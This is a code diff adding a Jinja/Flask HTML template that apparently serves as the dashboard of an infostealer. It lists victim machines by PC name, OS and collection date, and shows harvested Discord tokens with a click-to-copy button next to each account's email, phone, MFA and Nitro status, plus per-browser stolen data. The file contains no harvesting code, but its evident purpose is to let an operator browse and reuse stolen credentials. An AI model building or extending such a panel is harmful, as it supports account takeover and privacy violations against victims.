@@ -1,0 +1,440 @@
+{% extends "base.html" %}
+
+{% block styles %}
+<style>
+    :root {
+        --primary-color: #6c5ce7;
+        --secondary-color: #a29bfe;
+        --dark-color: #2d3436;
+        --light-color: #f5f6fa;
+        --glass-color: rgba(255, 255, 255, 0.15);
+        --glass-border: 1px solid rgba(255, 255, 255, 0.2);
+        --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        --glass-backdrop: blur(10px);
+    }
+
+    body {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        color: var(--light-color);
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .glass-card {
+        background: var(--glass-color);
+        backdrop-filter: var(--glass-backdrop);
+        -webkit-backdrop-filter: var(--glass-backdrop);
+        border-radius: 20px;
+        border: var(--glass-border);
+        box-shadow: var(--glass-shadow);
+        padding: 20px;
+        margin-bottom: 30px;
+        transition: all 0.3s ease;
+    }
+
+    .glass-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+    }
+
+    .card-header {
+        background: transparent;
+        border-bottom: var(--glass-border);
+        padding: 15px 20px;
+    }
+
+    .neon-text {
+        color: #fff;
+        text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px var(--primary-color), 0 0 20px var(--primary-color);
+        animation: neon-glow 1.5s ease-in-out infinite alternate;
+    }
+
+    @keyframes neon-glow {
+        from {
+            text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px var(--primary-color), 0 0 20px var(--primary-color);
+        }
+        to {
+            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px var(--primary-color), 0 0 40px var(--primary-color);
+        }
+    }
+
+    .info-card {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 15px;
+        padding: 20px;
+        height: 100%;
+        transition: all 0.3s ease;
+    }
+
+    .info-card:hover {
+        transform: scale(1.03);
+        background: rgba(255, 255, 255, 0.2);
+    }
+
+    .info-card h4 {
+        color: var(--light-color);
+        font-weight: 600;
+        margin-bottom: 15px;
+    }
+
+    .info-card p {
+        font-size: 1.1rem;
+        margin-bottom: 0;
+    }
+
+    .token-card {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 15px;
+        padding: 20px;
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .token-card::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+            to bottom right,
+            rgba(255, 255, 255, 0.3) 0%,
+            rgba(255, 255, 255, 0) 60%
+        );
+        transform: rotate(30deg);
+        pointer-events: none;
+    }
+
+    .token-card:hover {
+        transform: translateY(-5px);
+        background: rgba(255, 255, 255, 0.2);
+    }
+
+    .token-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+
+    .avatar {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        overflow: hidden;
+        margin-right: 15px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+    }
+
+    .avatar-img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    .user-info h5 {
+        margin-bottom: 5px;
+        font-weight: 600;
+    }
+
+    .discriminator {
+        color: var(--secondary-color);
+        font-size: 0.9em;
+        margin-left: 5px;
+    }
+
+    .badges {
+        display: flex;
+        gap: 8px;
+    }
+
+    .badge {
+        font-size: 0.7rem;
+        padding: 4px 8px;
+        border-radius: 10px;
+    }
+
+    .bg-purple {
+        background-color: #9b59b6;
+    }
+
+    .token-details {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 12px;
+    }
+
+    .detail-item {
+        display: flex;
+        align-items: center;
+    }
+
+    .detail-label {
+        min-width: 80px;
+        font-weight: 500;
+        margin-right: 10px;
+        color: var(--secondary-color);
+    }
+
+    .token-value {
+        position: relative;
+        cursor: pointer;
+        background: rgba(0, 0, 0, 0.2);
+        padding: 5px 10px;
+        border-radius: 5px;
+        flex-grow: 1;
+    }
+
+    .token-value code {
+        font-size: 0.85rem;
+        word-break: break-all;
+        color: #fff;
+    }
+
+    .copy-tooltip {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-size: 0.7rem;
+        background: rgba(0, 0, 0, 0.5);
+        padding: 2px 5px;
+        border-radius: 3px;
+        opacity: 0;
+        transition: opacity 0.3s;
+    }
+
+    .token-value:hover .copy-tooltip {
+        opacity: 1;
+    }
+
+    .browser-section {
+        margin-bottom: 25px;
+    }
+
+    .browser-title {
+        margin-bottom: 15px;
+        color: var(--light-color);
+    }
+
+    .accordion {
+        --bs-accordion-bg: transparent;
+        --bs-accordion-border-color: rgba(255, 255, 255, 0.1);
+        --bs-accordion-btn-color: var(--light-color);
+        --bs-accordion-active-color: var(--light-color);
+        --bs-accordion-active-bg: rgba(255, 255, 255, 0.1);
+        --bs-accordion-btn-focus-box-shadow: none;
+    }
+
+    .accordion-button {
+        background: rgba(255, 255, 255, 0.1);
+        color: var(--light-color);
+    }
+
+    .accordion-button:not(.collapsed) {
+        background: rgba(255, 255, 255, 0.2);
+    }
+
+    .data-card {
+        background: rgba(0, 0, 0, 0.1);
+        border-radius: 10px;
+        padding: 15px;
+        margin-bottom: 10px;
+    }
+
+    .data-card pre {
+        color: var(--light-color);
+        margin-bottom: 0;
+        white-space: pre-wrap;
+        font-family: 'Courier New', monospace;
+        font-size: 0.85rem;
+    }
+
+    .data-divider {
+        border-color: rgba(255, 255, 255, 0.1);
+        margin: 15px 0;
+    }
+
+    .btn-glow {
+        position: relative;
+        overflow: hidden;
+    }
+
+    .btn-glow::after {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+            to bottom right,
+            rgba(255, 255, 255, 0.3) 0%,
+            rgba(255, 255, 255, 0) 60%
+        );
+        transform: rotate(30deg);
+        pointer-events: none;
+        transition: all 0.3s ease;
+    }
+
+    .btn-glow:hover::after {
+        animation: glow-move 1.5s linear infinite;
+    }
+
+    @keyframes glow-move {
+        0% {
+            transform: rotate(30deg) translate(-10%, -10%);
+        }
+        100% {
+            transform: rotate(30deg) translate(10%, 10%);
+        }
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container py-4">
+    <div class="glass-card mb-4">
+        <div class="card-header d-flex justify-content-between align-items-center">
+            <h2 class="neon-text"><i class="fas fa-info-circle me-2"></i>System: {{ system['name'] }}</h2>
+            <a href="{{ url_for('index') }}" class="btn btn-secondary btn-glow">
+                <i class="fas fa-arrow-left me-1"></i> Back
+            </a>
+        </div>
+        <div class="card-body">
+            <div class="row">
+                <div class="col-md-4">
+                    <div class="info-card">
+                        <h4><i class="fas fa-desktop"></i> PC Name</h4>
+                        <p>{{ system['pc_name'] }}</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="info-card">
+                        <h4><i class="fab fa-windows"></i> OS</h4>
+                        <p>{{ system['os_info'] }}</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="info-card">
+                        <h4><i class="far fa-calendar-alt"></i> Date Collected</h4>
+                        <p>{{ system['timestamp'] }}</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="glass-card mb-4">
+        <div class="card-header">
+            <h3 class="neon-text"><i class="fab fa-discord me-2"></i>Discord Tokens</h3>
+        </div>
+        <div class="card-body">
+            <div class="row">
+                {% for token in tokens %}
+                <div class="col-md-6 mb-4">
+                    <div class="token-card glow-hover">
+                        <div class="token-header">
+                            <div class="avatar">
+                                <!-- <img src="https://cdn.discordapp.com/avatars/{{ token['user_id'] }}/{{ token['avatar'] }}.png" 
+                                     onerror="this.src='https://cdn.discordapp.com/embed/avatars/{{ (token['discriminator'] or '0000')|int % 5 }}.png'"
+                                     alt="Avatar" class="rounded-circle avatar-img"> -->
+                            </div>
+                            <div class="user-info">
+                                <h5>{{ token['username'] }}<span class="discriminator">#{{ token['discriminator'] }}</span></h5>
+                                <div class="badges">
+                                    {% if token['mfa_enabled'] %}
+                                    <span class="badge bg-success"><i class="fas fa-shield-alt"></i> MFA</span>
+                                    {% endif %}
+                                    {% if token['nitro_type'] != "None" %}
+                                    <span class="badge bg-purple"><i class="fas fa-gem"></i> {{ token['nitro_type'] }}</span>
+                                    {% endif %}
+                                </div>
+                            </div>
+                        </div>
+                        <div class="token-details">
+                            <div class="detail-item">
+                                <span class="detail-label"><i class="fas fa-key"></i> Token:</span>
+                                <div class="token-value" onclick="copyToClipboard(this)">
+                                    <code>{{ token['token'] }}</code>
+                                    <span class="copy-tooltip">Click to copy</span>
+                                </div>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label"><i class="fas fa-id-card"></i> User ID:</span>
+                                <span>{{ token['user_id'] }}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label"><i class="fas fa-envelope"></i> Email:</span>
+                                <span>{{ token['email'] or 'None' }}</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label"><i class="fas fa-phone"></i> Phone:</span>
+                                <span>{{ token['phone'] or 'None' }}</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+
+    <div class="glass-card">
+        <div class="card-header">
+            <h3 class="neon-text"><i class="fas fa-globe me-2"></i>Browser Data</h3>
+        </div>
+        <div class="card-body">
+            {% for browser, data_types in browser_data.items() %}
+            <div class="browser-section mb-4">
+                <h4 class="browser-title"><i class="fab fa-{{ browser|lower }} me-2"></i>{{ browser }}</h4>
+                
+                <div class="accordion" id="accordion{{ loop.index }}">
+                    {% for data_type, items in data_types.items() %}
+                    <div class="accordion-item">
+                        <h2 class="accordion-header" id="heading{{ loop.index }}">
+                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" 
+                                    data-bs-target="#collapse{{ loop.index }}" aria-expanded="false" 
+                                    aria-controls="collapse{{ loop.index }}">
+                                {{ data_type|title }} ({{ items|length }})
+                            </button>
+                        </h2>
+                        <div id="collapse{{ loop.index }}" class="accordion-collapse collapse" 
+                             aria-labelledby="heading{{ loop.index }}" data-bs-parent="#accordion{{ loop.index }}">
+                            <div class="accordion-body">
+                                {% for item in items %}
+                                <div class="data-card">
+                                    {% if item is string %}
+                                        <pre>{{ item }}</pre>
+                                    {% else %}
+                                        <pre>{{ item|tojson(indent=2) }}</pre>
+                                    {% endif %}
+                                </div>
+                                {% if not loop.last %}<hr class="data-divider">{% endif %}
+                                {% endfor %}
+                            </div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+</div>
+
+<script>
+function copyToClipboard(element) {
+    const textToCopy = element.querySelector('code').textContent;
+    navigator.clipboard.writeText(textToCopy).then(() => {
+        const tooltip = element.querySelector('.copy-tooltip');
+        const originalText = tooltip.textContent;
+        tooltip.textContent = 'Copied!';
+        setTimeout(() => {
+            tooltip.textContent = originalText;
+        }, 2000);
+    });
+}
+</script>
+{% endblock %}
